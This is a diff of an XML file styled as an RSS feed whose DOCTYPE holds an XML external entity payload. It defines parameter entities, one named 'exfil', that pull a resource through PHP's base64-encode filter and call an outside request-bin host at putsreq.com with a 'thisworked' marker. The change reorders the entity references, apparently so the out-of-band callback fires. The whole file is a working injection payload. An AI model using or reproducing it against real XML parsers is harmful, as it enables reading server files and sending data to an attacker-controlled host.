@@ -1,8 +1,8 @@
 <?xml version="1.0" encoding="UTF-8" ?>
 <!DOCTYPE roottag [ 
  <!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=http://putsreq.com/jcVVqYcNb9zESnp2Fqws?test=1">
- %file;
  <!ENTITY % exfil SYSTEM "http://putsreq.com/jcVVqYcNb9zESnp2Fqws?so=thisworked">
+ %file;
  %exfil;
 ]>
 <rss version="2.0">
